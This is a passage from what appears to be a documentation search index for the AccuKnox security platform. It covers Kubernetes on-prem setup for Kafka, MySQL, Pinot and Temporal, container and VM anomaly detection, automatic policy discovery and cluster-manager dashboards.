to base64 encoded format cat ca.pem | base64 > ca.pem.base64","title":"Notes"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#note","text":"ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files. FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity. FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092","title":"Note"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#get-certificates-and-store-it","text":"If the kafka cluster is upgraded or reinstalled, then the cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation). Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka > accuknox-clients-ca.yaml kubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka > accuknox-clients-ca-cert.yaml kubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka > accuknox-cluster-ca-cert.yaml kubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka > accuknox-cluster-ca.yaml kubectl get secret/node-event-feeder -o yaml -n accuknox-kafka > node-event-feeder.yaml kubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka > node-event-feeder-common.yaml","title":"Get Certificates and store it"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#verify-kafka-cluster-is-ready-or-not","text":"kubectl get kafka -n accuknox-kafka","title":"Verify Kafka cluster is ready or not"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#everything-should-be-in-running-and-ready-state","text":"kubectl get all -n accuknox-kafka","title":"Everything should be in Running and Ready state"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/","text":"helm pull accuknox-onprem-prerequisites/mysql-chart --untar kubectl create namespace accuknox-mysql cd mysql-chart kubectl apply -f bundle.yaml -n accuknox-mysql kubectl apply -f cr.yaml -n accuknox-mysql kubectl apply -f secrets.yaml -n accuknox-mysql kubectl apply -f ssl-secrets.yaml -n accuknox-mysql Verify Installation \u00b6 kubectl get secret -n accuknox-mysql | grep mysql kubectl apply -f backup-s3.yaml -n accuknox-mysql Loading schema \u00b6 helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar helm upgrade --install accuknox-mysql-schema mysql-schema-chart -n accuknox-mysql All pods should have in Running state kubectl get pods -n accuknox-mysql Notes \u00b6 To configure backup with GCS, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml. HMAC Keys will vary for cloud providers. (GCP, AZURE, AWS) After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the MySQL namespace kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -n accuknox-mysql -- bash -il mysql -h accuknox-mysql-haproxy -uroot -proot_password Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Optional \u00b6 To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files. FQDN: For K8\u2019s Service name accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local","title":"Mysql"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#verify-installation","text":"kubectl get secret -n accuknox-mysql | grep mysql kubectl apply -f backup-s3.yaml -n accuknox-mysql","title":"Verify Installation"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#loading-schema","text":"helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar helm upgrade --install accuknox-mysql-schema mysql-schema-chart -n accuknox-mysql All pods should have in Running state kubectl get pods -n accuknox-mysql","title":"Loading schema"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#notes","text":"To configure backup with GCS, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml. HMAC Keys will vary for cloud providers. (GCP, AZURE, AWS) After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the MySQL namespace kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -n accuknox-mysql -- bash -il mysql -h accuknox-mysql-haproxy -uroot -proot_password Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml","title":"Notes"},{"location":"accuknox-onprem/onprem-setup-steps/mysql/#optional","text":"To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files. FQDN: For K8\u2019s Service name accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local","title":"Optional"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/","text":"helm pull accuknox-onprem-prerequisites/pinot-chart --untar kubectl create namespace accuknox-pinot helm install accuknox-pinot pinot -n accuknox-pinot Everything should be in Running and Ready state \u00b6 kubectl get pods -n accuknox-pinot Loading Schema and Tables \u00b6 To load schema, It is necessary to open the Pinot dashboard. Run the below command to do port-forward and open http://localhost:9000/ in the browser. kubectl port-forward svc/accuknox-pinot-controller -n accuknox-pinot 9000 :9000 Select Swagger REST API from the side panel Schema Creation \u00b6 Download the pinot-schemas.zip file and unzip it and load all the schemas using below steps: Click to Download Pinot Schemas Under schema, Select POST /schemas Add a new schema Click Try it out Paste the schema file at body object and Execute It should be 200 response codes and follow the same steps to create all schemas. Tables Creation \u00b6 Download the pinot-table.zip file and unzip it. Please load all the tables using the below steps. Click to Download Pinot Tables Under TABLE Select POST /tables Add a new table. Click Try it out Paste Table configuration file at body object and Execute It should be 200 response codes and follow the same steps to create all tables.","title":"Pinot"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#everything-should-be-in-running-and-ready-state","text":"kubectl get pods -n accuknox-pinot","title":"Everything should be in Running and Ready state"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#loading-schema-and-tables","text":"To load schema, It is necessary to open the Pinot dashboard. Run the below command to do port-forward and open http://localhost:9000/ in the browser. kubectl port-forward svc/accuknox-pinot-controller -n accuknox-pinot 9000 :9000 Select Swagger REST API from the side panel","title":"Loading Schema and Tables"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#schema-creation","text":"Download the pinot-schemas.zip file and unzip it and load all the schemas using below steps: Click to Download Pinot Schemas Under schema, Select POST /schemas Add a new schema Click Try it out Paste the schema file at body object and Execute It should be 200 response codes and follow the same steps to create all schemas.","title":"Schema Creation"},{"location":"accuknox-onprem/onprem-setup-steps/pinot/#tables-creation","text":"Download the pinot-table.zip file and unzip it. Please load all the tables using the below steps. Click to Download Pinot Tables Under TABLE Select POST /tables Add a new table. Click Try it out Paste Table configuration file at body object and Execute It should be 200 response codes and follow the same steps to create all tables.","title":"Tables Creation"},{"location":"accuknox-onprem/onprem-setup-steps/temporal/","text":"Temporal operator deployment steps kubectl create ns accuknox-temporal git clone https://github.com/temporalio/helm-charts.git mv helm-charts temporal-server-chart helm dep up temporal-server-chart helm upgrade --install accuknox-temporal-server temporal-server-chart --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false --timeout 15m -n accuknox-temporal If Prometheus/ Grafana is not required, Use the below command. helm install --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false temporal . --timeout 15m -n accuknox-temporal kubectl get all -n temporal-server Set the namespace to default kubectl exec -n accuknox-temporal -it pod/temporaltest-admintools-<pod-id> -- /bin/bash tctl --ns accuknox-temporal n re For example, Port-forward the temporal-web (:8088) pod to view the temporal workflows UI. kubectl port-forward svc/accuknox-temporal-server-web 8088 :8088 -n accuknox-temporal","title":"Temporal"},{"location":"accuknox-onprem/onprem-setup-steps/what-is-next/","text":"How to onboard a K8\u2019s Cluster into AccuKnox","title":"What is next"},{"location":"anomaly-detection/how-does-it-work/","text":"How does it work \u00b6 Anomaly Detection has 2 phases: The training phase and the testing phase. Training phase : In this time period, Anomaly Detection monitors the container behavior. It monitors the system, process, and network activity of the container and creates mathematical training vectors. When the training time is completed, it uses the training vectors to create a mathematical model for the container. Testing phase : After completing the training phase, Anomaly Detection starts to evaluate the new data against the models.","title":"How does it work"},{"location":"anomaly-detection/how-does-it-work/#how-does-it-work","text":"Anomaly Detection has 2 phases: The training phase and the testing phase. Training phase : In this time period, Anomaly Detection monitors the container behavior. It monitors the system, process, and network activity of the container and creates mathematical training vectors. When the training time is completed, it uses the training vectors to create a mathematical model for the container. Testing phase : After completing the training phase, Anomaly Detection starts to evaluate the new data against the models.","title":"How does it work"},{"location":"anomaly-detection/how-to-train-containers/","text":"How to Train Containers \u00b6 Log in to your workspace in the Accuknox dashboard. On the left navigation pane, select the Anomaly Detection \u2192 Train containers Select the cluster in which you want the containers to train. Click on the Node Name to list out the containers. Select the containers and click on Train selected containers button on the right top corner. Now enter the training name and training time, then click on the Start Training button. After containers are trained, we can see the activities of the container and logs for each container in the Container Audit & Logs screen.","title":"How to Train Containers"},{"location":"anomaly-detection/how-to-train-containers/#how-to-train-containers","text":"Log in to your workspace in the Accuknox dashboard. On the left navigation pane, select the Anomaly Detection \u2192 Train containers Select the cluster in which you want the containers to train. Click on the Node Name to list out the containers. Select the containers and click on Train selected containers button on the right top corner. Now enter the training name and training time, then click on the Start Training button. After containers are trained, we can see the activities of the container and logs for each container in the Container Audit & Logs screen.","title":"How to Train Containers"},{"location":"anomaly-detection/how-to-train-vm/","text":"How to Train VM? \u00b6 Log in to your workspace in the AccuKnox dashboard. On the left navigation pane, select the Anomaly Detection \u2192 Train containers & VM . By default K8s will be there so, switch to VM mode by using Drop down. Select the VM Instance in which you want the VM processes to train. Click on the VM to list out the Processes under the VM. Select the Processes which you want to train and click on Train selected button on the right top corner. Now enter the training name and training time, then click on the Start Training button. After VM Processes are trained, we can see the activities of the VM and logs for each Process in the Audit & Logs screen.","title":"How to Train VMs"},{"location":"anomaly-detection/how-to-train-vm/#how-to-train-vm","text":"Log in to your workspace in the AccuKnox dashboard. On the left navigation pane, select the Anomaly Detection \u2192 Train containers & VM . By default K8s will be there so, switch to VM mode by using Drop down. Select the VM Instance in which you want the VM processes to train. Click on the VM to list out the Processes under the VM. Select the Processes which you want to train and click on Train selected button on the right top corner. Now enter the training name and training time, then click on the Start Training button. After VM Processes are trained, we can see the activities of the VM and logs for each Process in the Audit & Logs screen.","title":"How to Train VM?"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/","text":"Pre-requisites/Installation/Requirements for k8s \u00b6 Pre-requisites \u00b6 Cluster nodes with Docker as the container runtime. ( COS, and Ubuntu both are supported ). Cluster onboarded to Accuknox . Cluster_ID and Workspace_ID are provided by Accuknox. Note: Currently, the agents only support docker as the container runtime. Support for containerd will be added soon. Till then, make sure that the cluster onboarded has nodes with Docker as runtime. Installation Guide \u00b6 If you don't onboard your cluster to Accuknox platform Please follow the steps here","title":"Pre-requisites/Installation/Requirements for k8s"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/#pre-requisitesinstallationrequirements-for-k8s","text":"","title":"Pre-requisites/Installation/Requirements for k8s"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/#pre-requisites","text":"Cluster nodes with Docker as the container runtime. ( COS, and Ubuntu both are supported ). Cluster onboarded to Accuknox . Cluster_ID and Workspace_ID are provided by Accuknox. Note: Currently, the agents only support docker as the container runtime. Support for containerd will be added soon. Till then, make sure that the cluster onboarded has nodes with Docker as runtime.","title":"Pre-requisites"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-k8s/#installation-guide","text":"If you don't onboard your cluster to Accuknox platform Please follow the steps here","title":"Installation Guide"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-vm/","text":"Pre-requisites \u00b6 Ubuntu VM VM onboarded to Accuknox. Note Only supports ubuntu VMs for the current version. Installation Guide \u00b6 If you don't onboard your VM to the Accuknox platform, Please follow the steps here .","title":"Pre-requisites/Installation/Requirements for VMs"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-vm/#pre-requisites","text":"Ubuntu VM VM onboarded to Accuknox. Note Only supports ubuntu VMs for the current version.","title":"Pre-requisites"},{"location":"anomaly-detection/pre-requisites-installation-requirements-for-vm/#installation-guide","text":"If you don't onboard your VM to the Accuknox platform, Please follow the steps here .","title":"Installation Guide"},{"location":"anomaly-detection/vm-audit-and-logs/","text":"What does the Audit & Logs mean? \u00b6 The screen displays the Alert Summary and the logs being generated from the VAE core. After a model is trained for a VM process, the VM is monitored and VAE calculates the reconstruction error for that model. Reconstruction error: In the testing phase, Anomaly detection compares the VM\u2019s current behavior with the model that has been created and calculates a mean squared error called the reconstruction error. Since the behavior of the VM cannot be exactly the same as it was during the training period, a baseline of value 10 is used to filter out false positives. If the reconstruction error goes above 10, then the behavior is considered anomalous and an alert log is sent out. The alert log consists of the value of the reconstruction error along with the summary of the VM during that timestamp. The summary includes: General information Instance name, Instance Group, Instance ID, status of Instance, command issued at the given timestamp. VM resource information CPU, memory, read/write block, process count. Process activities forked, executed, killed process count. File activities opened, deleted, created, file count, etc. Network activities inbound/outbound connections, port counts, etc. On the left side of the VM audit log screen, we can see an Alert summary of each Instance or VM consisting of Instance name, each Process, Alert counts, and severities. Select any Process in the alert summary to see the detailed forensic view of the particular VM. Audit & Logs screen visualises the reconstruction error over time in a graph. This way, the user can look at the graph and see if the VM has been in an anomalous state for a long period of time.","title":"VM audit & logs"},{"location":"anomaly-detection/vm-audit-and-logs/#what-does-the-audit-logs-mean","text":"The screen displays the Alert Summary and the logs being generated from the VAE core. After a model is trained for a VM process, the VM is monitored and VAE calculates the reconstruction error for that model. Reconstruction error: In the testing phase, Anomaly detection compares the VM\u2019s current behavior with the model that has been created and calculates a mean squared error called the reconstruction error. Since the behavior of the VM cannot be exactly the same as it was during the training period, a baseline of value 10 is used to filter out false positives. If the reconstruction error goes above 10, then the behavior is considered anomalous and an alert log is sent out. The alert log consists of the value of the reconstruction error along with the summary of the VM during that timestamp. The summary includes: General information Instance name, Instance Group, Instance ID, status of Instance, command issued at the given timestamp. VM resource information CPU, memory, read/write block, process count. Process activities forked, executed, killed process count. File activities opened, deleted, created, file count, etc. Network activities inbound/outbound connections, port counts, etc. On the left side of the VM audit log screen, we can see an Alert summary of each Instance or VM consisting of Instance name, each Process, Alert counts, and severities. Select any Process in the alert summary to see the detailed forensic view of the particular VM. Audit & Logs screen visualises the reconstruction error over time in a graph. This way, the user can look at the graph and see if the VM has been in an anomalous state for a long period of time.","title":"What does the Audit &amp; Logs mean?"},{"location":"anomaly-detection/what-does-the-container-audit-and-logs-mean/","text":"What does the Container Audit & Logs mean \u00b6 The screen displays the Alert Summary and the logs being generated from the VAE core. After a model is trained for a container, the container is monitored and VAE calculates the reconstruction error for that model. Reconstruction error: In the testing phase, Anomaly detection compares the container\u2019s current behavior with the model that has been created and calculates a mean squared error called the reconstruction error. Since the behavior of the container cannot be exactly the same as it was during the training period, a baseline of value 10 is used to filter out false positives. If the reconstruction error goes above 10, then the behavior is considered anomalous and an alert log is sent out. The alert log consists of the value of the reconstruction error along with the summary of the container during that timestamp. The summary includes: General information (container name, node, cluster, container_id, status of container, command issued at the given timestamp) Container resource information (CPU, memory, read/write block, process count) Process activities (forked, executed, and killed process count) File activities (opened, deleted, created, etc. file count) Network activities ( inbound/outbound connections, port counts, etc.) On the left side of the container audit log screen, we can see an Alert summary of each container consisting of container name, Alert counts, and severities. Select any container in the alert summary to see the detailed forensic view of the particular container. Container Audit & Logs screen visualises the reconstruction error over time in a graph. This way, the user can look at the graph and see if the container has been in an anomalous state for a long period of time. Along with the reconstruction error, other information about the container is also sent out like container name, container ID, timestamp, commands, etc.","title":"What does the Container Audit & Logs mean"},{"location":"anomaly-detection/what-does-the-container-audit-and-logs-mean/#what-does-the-container-audit-logs-mean","text":"The screen displays the Alert Summary and the logs being generated from the VAE core. After a model is trained for a container, the container is monitored and VAE calculates the reconstruction error for that model. Reconstruction error: In the testing phase, Anomaly detection compares the container\u2019s current behavior with the model that has been created and calculates a mean squared error called the reconstruction error. Since the behavior of the container cannot be exactly the same as it was during the training period, a baseline of value 10 is used to filter out false positives. If the reconstruction error goes above 10, then the behavior is considered anomalous and an alert log is sent out. The alert log consists of the value of the reconstruction error along with the summary of the container during that timestamp. The summary includes: General information (container name, node, cluster, container_id, status of container, command issued at the given timestamp) Container resource information (CPU, memory, read/write block, process count) Process activities (forked, executed, and killed process count) File activities (opened, deleted, created, etc. file count) Network activities ( inbound/outbound connections, port counts, etc.) On the left side of the container audit log screen, we can see an Alert summary of each container consisting of container name, Alert counts, and severities. Select any container in the alert summary to see the detailed forensic view of the particular container. Container Audit & Logs screen visualises the reconstruction error over time in a graph. This way, the user can look at the graph and see if the container has been in an anomalous state for a long period of time. Along with the reconstruction error, other information about the container is also sent out like container name, container ID, timestamp, commands, etc.","title":"What does the Container Audit &amp; Logs mean"},{"location":"anomaly-detection/what-is-anomaly-detection/","text":"What is Anomaly Detection \u00b6 Anomaly detection is a tool that finds the outliers of a dataset; those items that don\u2019t belong. These anomalies might point to unusual network traffic, uncover a sensor on the fritz, or simply identify data for cleaning, before analysis. VAE is an autoencoder whose encoding distribution is regularized during the training in order to ensure that its latent space has good properties allowing us to generate some new data. Moreover, the term \u201cvariational\u201d comes from the close relation there is between the regularization and the variational inference method in statistics.","title":"What is Anomaly Detection"},{"location":"anomaly-detection/what-is-anomaly-detection/#what-is-anomaly-detection","text":"Anomaly detection is a tool that finds the outliers of a dataset; those items that don\u2019t belong. These anomalies might point to unusual network traffic, uncover a sensor on the fritz, or simply identify data for cleaning, before analysis. VAE is an autoencoder whose encoding distribution is regularized during the training in order to ensure that its latent space has good properties allowing us to generate some new data. Moreover, the term \u201cvariational\u201d comes from the close relation there is between the regularization and the variational inference method in statistics.","title":"What is Anomaly Detection"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/","text":"Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively. Auto Discovery is available only for Kubernetes environments right now; it focuses on pods/services, and its fundamental principle is to produce a minimal network and system policy set covering maximum behavior. To do this, we actively use the label information assigned from the Kubernetes workloads/resources. Currently, Auto Discovery can discover (i) egress/ingress network policy for Pod-to- Pod, (External)Service, Entity, CIDR, FQDN, HTTP. And, In the System perspective it can discover (ii) process, file, and network-relevant system policy. Functionality Overview \u00b6 Produce a minimum network policy set covering maximum network flows When discovering the network policies, if we generate the policies applied to a single pod statically, there would be lots of network policies. In contrast, Auto Discovery produces the minimum network policy set that can cover the maximum network flows so that we can manage the network policies more efficiently and effectively. For example, Auto Discovery collects the label information of the pods, and then computes the intersection of labels, which is the most included in the source (or destination) pods. Identify overlapped network policy Regarding the external destination, Auto Discovery builds CIDR or FQDN-based policies, and to do this it takes two steps. First, if it comes across the external IP address as the destination, it tries to convert the IP address to the domain name by leveraging the reverse domain services. Next, if it fails to find the domain name, it retrieves the domain name from an internal map that matches the domain name to the IP address collected by DNS query and response packets from the kube-dns traffic. Thus, building FQDN based policies has a higher priority than CIDR policies. Inevitably, CIDR policies could be discovered if there is no information on the matched domain names. However, if we build an FQDN policy that overlaps the prior CIDR policy, Auto Discovery can tag and update those policies so that we can maintain the latest network policies. Operate in runtime or on the collected network logs in advance Generally, Auto Discovery discovers the network policies by extracting the network logs from the database every time intervals. In addition, It can connect to a log monitor directly (e.g., Cilium Hubble), and receive the network log, and then produce the network policies in runtime. Support various network and system policy discovery modes Fundamentally, a pod has two types of network policy in Kubernetes; egress and ingress. The egress policy restricts the outbound network flows and the other way, the ingress policy operates against the inbound network flows. In this context, Auto Discovery supports both types of policy discovery modes; egress-centric and ingress-centric. Additionally System-centric also. System Policy can be of process, file, and network types. Thus, users can choose one of them depending on their demand. Policy Discovery Examples \u00b6 The intersection of matched labels \u00b6 Let's assume that there are three pods and two connections between them as shown in the above figure. From the network logs from it, the Auto Discovery does not discover the two distinct network policies; [Pod A -> Pod C] and [Pod A -> Pod C]. Instead, since Pod A and Pod B have the intersection of the labels, which is 'group=alice', the knoxAutoPolicy discovers and generates a network policy that has the selector with matchLabels 'group=alice'. Finally, we can get one network policy that covers two distinct network flows [group=alice -> Pod C]. The aggregation of toPorts rules per the same destination \u00b6 Similar to the previous case, we can merge the multiple toPorts rules per each same destination. Let's assume that there are the source and destination pods and three different flows as shown in the above figure. In this case, the Auto Discovery does not generate three different network policies per each toPorts rule. More efficiently, the Auto Discovery discovers one network policy and has one matchLabel rule and three toPorts rules; port numbers are 443, 8080, and 80. From this merge, it can be enabled to produce a minimum network policy set covering maximum network flows. The trace of the outdated network policy \u00b6 Since the Auto Discovery can do the discovery job at the time intervals, there could be some overlapping. For example, as shown in the above figure, let's assume we discovered policy A and B at the time t1 and t2 respectively. However, policy B has the same toCIDRs rule as policy A does but a different toPorts rule. In this case, It updates policy B by merging the toPorts rule to the latest one, and then it marks policy A as outdated and puts the relevant latest policy name. Thus, users can retrieve only the latest network policies from the database. Auto Discovered Policies Dashboard \u00b6 You can filter Auto Discovered Policies using following filters: Cluster :- Filter Policies by clusters belonging to your workspace. Namespace: Filter Policies by namespaces belonging to selected clusters Policy-Type: Filter Policies by Policy types. There are 3 Policy types. (i) Network-Ingress (ii) Network-Egress (iii) System Policy Category: Category will give the status of the policies. There are 2 categories. Used : When the Policy is applied from the Auto Discovered Policy Screen, It will go to All Policy Screen and Category will be changed to Used . You can list all used policies with used category. Ignore: You can list all ignored policies using this filter. Apply Auto Discovered Policies. \u00b6 Select one or more policies from the list Note: Default screen will show all un-used policies. Click \u201c Action \u201d Button on the top right corner. There are 3 Actions can be performed. (i) Apply (ii) Ignore (iii) Deselect all Click Apply . Then Policy will be applied to the cluster. Applied Policy will go to pending approval. Go to \u201cPending Approval\u201d screen and Approve the policy. Note: You need Administrative permission to approve policies. Approved Policy will go to All Policies Screen.","title":"Auto discovery of policies"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#functionality-overview","text":"Produce a minimum network policy set covering maximum network flows When discovering the network policies, if we generate the policies applied to a single pod statically, there would be lots of network policies. In contrast, Auto Discovery produces the minimum network policy set that can cover the maximum network flows so that we can manage the network policies more efficiently and effectively. For example, Auto Discovery collects the label information of the pods, and then computes the intersection of labels, which is the most included in the source (or destination) pods. Identify overlapped network policy Regarding the external destination, Auto Discovery builds CIDR or FQDN-based policies, and to do this it takes two steps. First, if it comes across the external IP address as the destination, it tries to convert the IP address to the domain name by leveraging the reverse domain services. Next, if it fails to find the domain name, it retrieves the domain name from an internal map that matches the domain name to the IP address collected by DNS query and response packets from the kube-dns traffic. Thus, building FQDN based policies has a higher priority than CIDR policies. Inevitably, CIDR policies could be discovered if there is no information on the matched domain names. However, if we build an FQDN policy that overlaps the prior CIDR policy, Auto Discovery can tag and update those policies so that we can maintain the latest network policies. Operate in runtime or on the collected network logs in advance Generally, Auto Discovery discovers the network policies by extracting the network logs from the database every time intervals. In addition, It can connect to a log monitor directly (e.g., Cilium Hubble), and receive the network log, and then produce the network policies in runtime. Support various network and system policy discovery modes Fundamentally, a pod has two types of network policy in Kubernetes; egress and ingress. The egress policy restricts the outbound network flows and the other way, the ingress policy operates against the inbound network flows. In this context, Auto Discovery supports both types of policy discovery modes; egress-centric and ingress-centric. Additionally System-centric also. System Policy can be of process, file, and network types. Thus, users can choose one of them depending on their demand.","title":"Functionality Overview"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#policy-discovery-examples","text":"","title":"Policy Discovery Examples"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#the-intersection-of-matched-labels","text":"Let's assume that there are three pods and two connections between them as shown in the above figure. From the network logs from it, the Auto Discovery does not discover the two distinct network policies; [Pod A -> Pod C] and [Pod A -> Pod C]. Instead, since Pod A and Pod B have the intersection of the labels, which is 'group=alice', the knoxAutoPolicy discovers and generates a network policy that has the selector with matchLabels 'group=alice'. Finally, we can get one network policy that covers two distinct network flows [group=alice -> Pod C].","title":"The intersection of matched labels"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#the-aggregation-of-toports-rules-per-the-same-destination","text":"Similar to the previous case, we can merge the multiple toPorts rules per each same destination. Let's assume that there are the source and destination pods and three different flows as shown in the above figure. In this case, the Auto Discovery does not generate three different network policies per each toPorts rule. More efficiently, the Auto Discovery discovers one network policy and has one matchLabel rule and three toPorts rules; port numbers are 443, 8080, and 80. From this merge, it can be enabled to produce a minimum network policy set covering maximum network flows.","title":"The aggregation of toPorts rules per the same destination"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#the-trace-of-the-outdated-network-policy","text":"Since the Auto Discovery can do the discovery job at the time intervals, there could be some overlapping. For example, as shown in the above figure, let's assume we discovered policy A and B at the time t1 and t2 respectively. However, policy B has the same toCIDRs rule as policy A does but a different toPorts rule. In this case, It updates policy B by merging the toPorts rule to the latest one, and then it marks policy A as outdated and puts the relevant latest policy name. Thus, users can retrieve only the latest network policies from the database.","title":"The trace of the outdated network policy"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#auto-discovered-policies-dashboard","text":"You can filter Auto Discovered Policies using following filters: Cluster :- Filter Policies by clusters belonging to your workspace. Namespace: Filter Policies by namespaces belonging to selected clusters Policy-Type: Filter Policies by Policy types. There are 3 Policy types. (i) Network-Ingress (ii) Network-Egress (iii) System Policy Category: Category will give the status of the policies. There are 2 categories. Used : When the Policy is applied from the Auto Discovered Policy Screen, It will go to All Policy Screen and Category will be changed to Used . You can list all used policies with used category. Ignore: You can list all ignored policies using this filter.","title":"Auto Discovered Policies Dashboard"},{"location":"auto_discovery_of_policies/auto_discovery_of_policies/#apply-auto-discovered-policies","text":"Select one or more policies from the list Note: Default screen will show all un-used policies. Click \u201c Action \u201d Button on the top right corner. There are 3 Actions can be performed. (i) Apply (ii) Ignore (iii) Deselect all Click Apply . Then Policy will be applied to the cluster. Applied Policy will go to pending approval. Go to \u201cPending Approval\u201d screen and Approve the policy. Note: You need Administrative permission to approve policies. Approved Policy will go to All Policies Screen.","title":"Apply Auto Discovered Policies."},{"location":"cluster_manager/cluster-management/","text":"Cluster Manager allows you to get deep observability into your Kubernetes and VM workloads. The module provides a unified view of your Kubernetes and VM infrastructure. A single dashboard for VM workloads as well as Kubernetes Clusters, Nodes, Pods, and Namespaces. You can easily filter by any of these entities and view associated details. There are two views in the Cluster Manager Dashboard List View Graph View Observability into kubernetes cluster Observability into VM/Bare-metal","title":"Overview"},{"location":"cluster_manager/k8s-cluster-management/","text":"Observability into your Kubernetes cluster \u00b6 Select Cluster Manager \u2192 K8s Cluster The following three views will give three different levels of visibility into your Kubernetes clusters. Cluster View (Default Screen) Node View Pod View All Cluster Manager screens have a time filter in the top right corner that can be used to filter by the time intervals. Fig: Right-click on the cluster/node/pod From Cluster Manager screens you can do the following operations. It acts as a hybrid screen. Add Policies Add Label View Policies View Recommended Policies You can make use of all these functionalities in all three views of the cluster manager. You have the additional option of View Pods in the Cluster View. Cluster View \u00b6 This discusses the Clusters View page and helps you understand the data displayed on the screen. The Cluster Overview page provides key metrics such as labels, the number of nodes, the number of policies, alerts, etc. of each cluster. Your cluster can reside in any cloud environment of your choice. Each row represents a cluster. You can further drill down to the Nodes or Pods View page. Cluster Data \u00b6 Number of nodes:- Kubernetes runs your workload by placing containers into Pods to run on Nodes. The number shows the available nodes across the entire cluster. Number of pods:- The number shows available pods across the entire cluster. Number of Policies:- The number shows the number of active policies across the entire cluster. Alerts:- Number of alerts across the entire cluster. Location:- The zone/region in which your cluster (control plane and nodes) are located. Node View \u00b6 Left Click on any cluster from the cluster view screen will take you to Node view. Node Data \u00b6 Labels:- Number of available labels on specific node. Number of pods: Number of pods successfully scheduled at a specific node. Number of Policies: Number of Host polices applied to specific node. Host policies apply to all the nodes selected by their Node Selector. Alerts: Number of alerts across the specific node. Location: The zone/region in which your cluster (control plane and nodes) are located. Pod View \u00b6 Left click on any node from the node view will take you to Pod view screen. This view will list all the pods in the node along with details. Pod Data \u00b6 Workload: Workload column is giving workload identity of the given pod. Workload is identified by the Accuknox workload identification engine. Accuknox will recommend policies based on this workload identification. Labels: Number of available labels on a specific pod. Number of containers: Available number of containers inside a pod. Number of Policies: Number of policies applied to the pod. Location: The zone/region in which your cluster (control plane and nodes) are located. Alerts: Number of alerts for the specific node. View network traffic/Graph view \u00b6 Network traffic view will give additional flow information between the pods. This network traffic is grouped by namespaces. This view will give much visibility to your workloads. Allowed traffic is indicated by the green lines and Restricted traffic is indicated by the red lines. When you right-click on a pod, you can see pod-related details on the right of the screen, and similarly, when you right-click on the flow line you are able to see a connection summary between two pods. You can also add policies to the connection from the connection summary window. There is an option to see the entire network traffic across your cluster. Cluster List view -> click Number of pods -> View Network Traffic This will give you network traffic for your entire cluster. Analyzing the flow information of your cluster, you can take decisions on how to secure your workloads at run-time.","title":"Observability into kubernetes cluster"},{"location":"cluster_manager/k8s-cluster-management/#observability-into-your-kubernetes-cluster","text":"Select Cluster Manager \u2192 K8s Cluster The following three views will give three different levels of visibility into your Kubernetes clusters. Cluster View (Default Screen) Node View Pod View All Cluster Manager screens have a time filter in the top right corner that can be used to filter by the time intervals. Fig: Right-click on the cluster/node/pod From Cluster Manager screens you can do the following operations. It acts as a hybrid screen. Add Policies Add Label View Policies View Recommended Policies You can make use of all these functionalities in all three views of the cluster manager. You have the additional option of View Pods in the Cluster View.","title":"Observability into your Kubernetes cluster"},{"location":"cluster_manager/k8s-cluster-management/#cluster-view","text":"This discusses the Clusters View page and helps you understand the data displayed on the screen. The Cluster Overview page provides key metrics such as labels, the number of nodes, the number of policies, alerts, etc. of each cluster. Your cluster can reside in any cloud environment of your choice. Each 